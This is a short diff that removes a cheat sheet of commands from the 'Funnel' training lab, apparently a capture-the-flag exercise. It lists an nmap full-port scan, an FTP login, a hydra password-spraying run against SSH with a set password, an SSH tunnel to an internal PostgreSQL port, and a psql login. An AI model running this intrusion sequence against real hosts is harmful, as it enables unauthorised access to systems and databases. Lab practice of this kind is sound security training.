@@ -1,6 +1,0 @@
-# Useful commands used during the Funnel lab
-nmap -sC -sV -p- <target_ip>
-ftp <target_ip>
-hydra -L usernames.txt -p 'funnel123#!#' <target_ip> ssh
-ssh -L 1234:localhost:5432 christine@<target_ip>
-psql -U christine -h localhost -p 1234
